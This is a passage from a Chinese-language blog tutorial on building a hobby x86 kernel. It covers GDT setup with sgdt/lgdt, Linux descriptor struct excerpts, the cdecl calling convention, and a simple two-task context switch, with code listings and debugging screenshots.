class="string">&quot;init gdt!!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;sgdt gdt_ptr&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;gdt, (<span class="type">void</span> *)gdt_ptr.base, gdt_ptr.limit + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    gdt_ptr.base = (u32)&amp;gdt;</span><br><span class="line">    gdt_ptr.limit = <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>;</span><br><span class="line">    BMB;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;lgdt gdt_ptr\n&quot;</span>)</span>;</span><br><span class="line">    BMB;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    gdt_init();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/fd03cfb7eef4da9465149b51b1f48d3c.png" alt="image-20220308104058648" /></p><p>这里是MBR最开始的GDT，也是第一个断点</p><p>在执行<code>lgdt ds:addr</code>后</p><p><img src="https://img.joe1sn.top/uploads/big/92acbbf06e243c7ed75f609b23cfff5d.png" alt="image-20220308104351539" /></p><p>这样就扩充到了127个GDT</p><p><strong>拓展 在linux内核中是如何实现的</strong></p><ol><li><p>到了保护模式，内存管理分为段式，和段页式，也就是段模式必不可少</p></li><li><p>对段模式来说，访问一个内存仍然用的【段基地址：偏移地址】</p></li><li><p>GDT：把这些长度为64bit的段描述符放入一个数组中，而将段寄存器中的值作为下标索引来间接引用</p><ul><li>段描述符</li></ul><p><img src="https://img.joe1sn.top/uploads/big/299c5e18640751e63a6ac5f200325952.png" alt="" /><img src="https://img.joe1sn.top/uploads/big/e2b5b1af0bef396f8e24d0506aee8403.png" alt="" /></p><p>​同样的在源码中有</p><p>​<a href="https://elixir.bootlin.com/linux/v5.16.12/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include/asm">asm</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include/asm/desc_defs.h">desc_defs.h</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __ASSEMBLY__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GDT_ENTRY_INIT(flags, base, limit)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">.limit0= (u16) (limit),\</span></span><br><span class="line"><span class="meta">.limit1= ((limit) &gt;&gt; 16) &amp; 0x0F,\</span></span><br><span class="line"><span class="meta">.base0= (u16) (base),\</span></span><br><span class="line"><span class="meta">.base1= ((base) &gt;&gt; 16) &amp; 0xFF,\</span></span><br><span class="line"><span class="meta">.base2= ((base) &gt;&gt; 24) &amp; 0xFF,\</span></span><br><span class="line"><span class="meta">.type= (flags &amp; 0x0f),\</span></span><br><span class="line"><span class="meta">.s= (flags &gt;&gt; 4) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">.dpl= (flags &gt;&gt; 5) &amp; 0x03,\</span></span><br><span class="line"><span class="meta">.p= (flags &gt;&gt; 7) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">.avl= (flags &gt;&gt; 12) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">.l= (flags &gt;&gt; 13) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">.d= (flags &gt;&gt; 14) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">.g= (flags &gt;&gt; 15) &amp; 0x01,\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* LDT or TSS descriptor in the GDT. */</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_ptr</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> address;</span><br><span class="line">&#125; __attribute__((packed)) ;</span><br></pre></td></tr></table></figure><ul><li><p>在<a href="https://elixir.bootlin.com/linux/v5.16.12/source">/</a><a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch">arch</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86">x86</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include">include</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include/asm">asm</a>/<a href="https://elixir.bootlin.com/linux/v5.16.12/source/arch/x86/include/asm/desc.h">desc.h</a>定义了一个描述符数组，则为gdt</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_page</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">gdt</span>[<span class="title">GDT_ENTRIES</span>];</span></span><br><span class="line">&#125; __attribute__((aligned(PAGE_SIZE)));</span><br></pre></td></tr></table></figure><p>最后更具这个找到gdt的相关应用就行了</p></li></ul></li></ol><h2 id="进程调度及上下文切换"><a class="markdownIt-Anchor" href="#进程调度及上下文切换"></a> 进程调度及上下文切换</h2><p>在32位下，参数传递是通过栈传递的，但是具体的信息会保存到寄存器中，所以我们为了不修改寄存器的值，有一套调用规则。主要有SystemV规则和Posix规则</p><p>​System V</p><blockquote><p>The System V Interface Definition (SVID) is a standard that describes the AT&amp;T UNIX System V behavior, including that of system calls, C libraries, available programs and devices.</p></blockquote><p>​Posix</p><blockquote><p>Portable Operating System Interface standards specified by IEEE to define application programming interface (API). POSIX covers all the three forms of IPC</p></blockquote><p><strong>cdecl</strong></p><ol><li>函数实参在线程栈上按照从右至左的顺序依次压栈。</li><li>函数结果保存在寄存器EAX/AX/AL中</li><li>调用者负责从线程栈中弹出实参（即清栈）</li><li>受到函数调用影响的寄存器（volatile registers）：EAX, ECX, EDX, ST0 - ST7, ES, GS</li><li>不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS</li></ol><p>因为函数调用的时候不受函数调用影响的寄存器： EBX, EBP, ESP, EDI, ESI, CS, DS，我们简化为EBX、ESI、EDI，所以我们需要保存这些</p><p><code>src/kernel/schedule.asm</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">global task_switch</span><br><span class="line">task_switch:</span><br><span class="line">    push ebp</span><br><span class="line">    mov ebp, esp</span><br><span class="line"></span><br><span class="line">    push ebx</span><br><span class="line">    push esi</span><br><span class="line">    push edi</span><br><span class="line"></span><br><span class="line">    mov eax, esp;</span><br><span class="line">    and eax, 0xfffff000; current</span><br><span class="line"></span><br><span class="line">    mov [eax], esp</span><br><span class="line"></span><br><span class="line">    mov eax, [ebp + 8]; next</span><br><span class="line">    mov esp, [eax]</span><br><span class="line"></span><br><span class="line">    pop edi</span><br><span class="line">    pop esi</span><br><span class="line">    pop ebx</span><br><span class="line">    pop ebp</span><br><span class="line"></span><br><span class="line">    ret</span><br></pre></td></tr></table></figure><p>为了理解上面的其他细节，我们假设有这么一种情况：我们同时有两个函数（任务|进程）A、B，两者需要相互切换，且连两个程序跑起来的时候都是在栈上面，其中的栈就是内核栈(kernel stack)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u32 *<span class="built_in">stack</span>; <span class="comment">// 内核栈</span></span><br><span class="line">&#125; <span class="type">task_t</span>;</span><br></pre></td></tr></table></figure><p>因为系统是32位的，所以栈可以暂时表示32位数组</p><p>进程创建的时候，我们要初始化进程相对应的栈</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">task_create</span><span class="params">(<span class="type">task_t</span> *task, <span class="type">target_t</span> target)</span></span><br><span class="line">&#123;</span><br><span class="line">    u32 <span class="built_in">stack</span> = (u32)task + PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> -= <span class="keyword">sizeof</span>(<span class="type">task_frame_t</span>);</span><br><span class="line">    <span class="type">task_frame_t</span> *frame = (<span class="type">task_frame_t</span> *)<span class="built_in">stack</span>;</span><br><span class="line">    frame-&gt;ebx = <span class="number">0x11111111</span>;</span><br><span class="line">    frame-&gt;esi = <span class="number">0x22222222</span>;</span><br><span class="line">    frame-&gt;edi = <span class="number">0x33333333</span>;</span><br><span class="line">    frame-&gt;ebp = <span class="number">0x44444444</span>;</span><br><span class="line">    frame-&gt;eip = (<span class="type">void</span> *)target;</span><br><span class="line"></span><br><span class="line">    task-&gt;<span class="built_in">stack</span> = (u32 *)<span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当A向B切换的时候，我们就需要得到当前进程的内存地址，保存相关信息（EBX ESI EDI），这个相关信息就是<strong>任务上下文</strong></p><p>调度函数可有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">task_t</span> *current = running_task();</span><br><span class="line">    <span class="type">task_t</span> *next = current == a ? b : a;</span><br><span class="line">    task_switch(next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么对于最开始的schedule.asm就有：</p><ol><li>最开始的保存栈信息</li><li>将 <strong>ebx esi edi</strong> 压入栈保存</li><li>将当前栈顶<strong>esp</strong>转到<strong>eax</strong>上面，再将eax&amp;0xfffff000得到下一个任务的地址，再将当前栈顶转移到下一个任务地址中</li><li>将传入的<strong>next</strong>值转移到eax中作为返回值，再将下一个任务的地址转到栈顶中</li><li>最后再pop恢复栈平衡，返回后就可以到下一个任务了</li></ol><p><code>src/include/xsys/task.h</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XSYS_TASK_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XSYS_TASK_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> u32 <span class="title function_">target_t</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u32 *<span class="built_in">stack</span>; <span class="comment">// 内核栈</span></span><br><span class="line">&#125; <span class="type">task_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_frame_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    u32 edi;</span><br><span class="line">    u32 esi;</span><br><span class="line">    u32 ebx;</span><br><span class="line">    u32 ebp;</span><br><span class="line">    <span class="type">void</span> (*eip)(<span class="type">void</span>);</span><br><span class="line">&#125; <span class="type">task_frame_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p><code>src/kernel/task.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/task.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/printk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="type">task_t</span> *a = (<span class="type">task_t</span> *)<span class="number">0x1000</span>;</span><br><span class="line"><span class="type">task_t</span> *b = (<span class="type">task_t</span> *)<span class="number">0x2000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> <span class="title function_">task_switch</span><span class="params">(<span class="type">task_t</span> *next)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">task_t</span> *<span class="title function_">running_task</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;movl %esp, %eax\n&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;andl $0xfffff000, %eax\n&quot;</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">task_t</span> *current = running_task();</span><br><span class="line">    <span class="type">task_t</span> *next = current == a ? b : a;</span><br><span class="line">    task_switch(next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u32 <span class="title function_">thread_a</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">        schedule();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u32 <span class="title function_">thread_b</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">        schedule();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">task_create</span><span class="params">(<span class="type">task_t</span> *task, <span class="type">target_t</span> target)</span></span><br><span class="line">&#123;</span><br><span class="line">    u32 <span class="built_in">stack</span> = (u32)task + PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">stack</span> -= <span class="keyword">sizeof</span>(<span class="type">task_frame_t</span>);</span><br><span class="line">    <span class="type">task_frame_t</span> *frame = (<span class="type">task_frame_t</span> *)<span class="built_in">stack</span>;</span><br><span class="line">    frame-&gt;ebx = <span class="number">0x11111111</span>;</span><br><span class="line">    frame-&gt;esi = <span class="number">0x22222222</span>;</span><br><span class="line">    frame-&gt;edi = <span class="number">0x33333333</span>;</span><br><span class="line">    frame-&gt;ebp = <span class="number">0x44444444</span>;</span><br><span class="line">    frame-&gt;eip = (<span class="type">void</span> *)target;</span><br><span class="line"></span><br><span class="line">    task-&gt;<span class="built_in">stack</span> = (u32 *)<span class="built_in">stack</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">task_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    task_create(a, thread_a);</span><br><span class="line">    task_create(b, thread_b);</span><br><span class="line">    schedule();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>src/kernel/main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/xsys.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/console.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/debug.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/global.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;xsys/task.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> message[] = <span class="string">&quot;HELLO XSYS\n&quot;</span>;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">kernel_init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    console_init();</span><br><span class="line">    gdt_init();</span><br><span class="line">    task_init();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/8ea8b2dc83ba95afac2029bb10bdba38.png" alt="image-20220309144037664" /></p><p><strong>调试</strong></p><p>有如下两个断点</p><img src="https://img.joe1sn.top/uploads/big/a9d5322407ed0a8051c1b72fc853a7f9.png" alt="image-20220310163610879" style="zoom:67%;" /><p>这里的汇编我无法定位到具体文件，所以得gdb看一下了</p><p><img src="https://img.joe1sn.top/uploads/big/94bdc3843bd07282c5b7f891dc3cf53f.png" alt="image-20220310182900115" /></p><p><img src="https://img.joe1sn.top/uploads/big/6322327b9302b9025d133a44a0e5041b.png" alt="image-20220310182935275" /></p><p>得到<code>current=0x1000</code></p><p>再通过task_switch切换</p><p><img src="https://img.joe1sn.top/uploads/big/868c57e980cca89c189a378171c6a678.png" alt="image-20220310183106121" /></p><p><img src="https://img.joe1sn.top/uploads/big/5af4c34b27fcfd37443b006bd20d3698.png" alt="image-20220310183230665" /></p><p>当前任务（A）的值被压入了栈中，然后再次得到当前栈的信息，之后将esp信息保存到*eax即0x1000中</p><p><img src="https://img.joe1sn.top/uploads/big/406459ee885c28c6c57f59da51f395a6.png" alt="image-20220310183606571" /></p><p><img src="https://img.joe1sn.top/uploads/big/ba14f85b90c244b45e6c046f9d7f3368.png" alt="image-20220310183808780" /></p><p>再将下一个任务的地址放入到esp中</p><p><img src="https://img.joe1sn.top/uploads/big/4edc571d008184494d164b0dc06cc801.png" alt="image-20220310183946212" /></p><p>然后我们就可以切换到任务B的栈</p><img src="https://img.joe1sn.top/uploads/big/5c5a55cd8465fb52162398a383c9d198.png" alt="image-20220310184200559" style="zoom:80%;" /><img src="https://img.joe1sn.top/uploads/big/2415ee8e05a7dc2a005bcab39b68eb02.png" alt="image-20220310184243730" style="zoom:80%;" /><img src="https://img.joe1sn.top/uploads/big/3fab48582a5ea732c8a420ea4ca0c52b.png" alt="image-20220310184334862" style="zoom:80%;" /><h2 id="小总结"><a class="markdownIt-Anchor" href="#小总结"></a> 小总结</h2><p>目前的工程文件树：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">joe1sn@ubuntu:~/Desktop/os2$ tree</span><br><span class="line">.</span><br><span class="line">├── build</span><br><span class="line">│   ├── boot</span><br><span class="line">│   │   ├── boot.bin</span><br><span class="line">│   │   └── loader.bin</span><br><span class="line">│   ├── kernel</span><br><span class="line">│   │   ├── assert.o</span><br><span class="line">│   │   ├── console.o</span><br><span class="line">│   │   ├── debug.o</span><br><span class="line">│   │   ├── global.o</span><br><span class="line">│   │   ├── io.o</span><br><span class="line">│   │   ├── main.o</span><br><span class="line">│   │   ├── printk.o</span><br><span class="line">│   │   ├── schedule.o</span><br><span class="line">│   │   ├── start.o</span><br><span class="line">│   │   └── task.o</span><br><span class="line">│   ├── kernel.bin</span><br><span class="line">│   ├── lib</span><br><span class="line">│   │   ├── string.o</span><br><span class="line">│   │   └── vsprintf.o</span><br><span class="line">│   ├── master.img</span><br><span class="line">│   ├── system.bin</span><br><span class="line">│   └── system.map</span><br><span class="line">└── src</span><br><span class="line">    ├── bochsrc</span><br><span class="line">    ├── boot</span><br><span class="line">    │   ├── boot.asm</span><br><span class="line">    │   └── loader.asm</span><br><span class="line">    ├── include</span><br><span class="line">    │   └── xsys</span><br><span class="line">    │       ├── assert.h</span><br><span class="line">    │       ├── console.h</span><br><span class="line">    │       ├── debug.h</span><br><span class="line">    │       ├── global.h</span><br><span class="line">    │       ├── io.h</span><br><span class="line">    │       ├── printk.h</span><br><span class="line">    │       ├── stdarg.h</span><br><span class="line">    │       ├── stdio.h</span><br><span class="line">    │       ├── string.h</span><br><span class="line">    │       ├── task.h</span><br><span class="line">    │       ├── types.h</span><br><span class="line">    │       └── xsys.h</span><br><span class="line">    ├── kernel</span><br><span class="line">    │   ├── assert.c</span><br><span class="line">    │   ├── console.c</span><br><span class="line">    │   ├── debug.c</span><br><span class="line">    │   ├── global.c</span><br><span class="line">    │   ├── io.asm</span><br><span class="line">    │   ├── main.c</span><br><span class="line">    │   ├── printk.c</span><br><span class="line">    │   ├── schedule.asm</span><br><span class="line">    │   ├── start.asm</span><br><span class="line">    │   └── 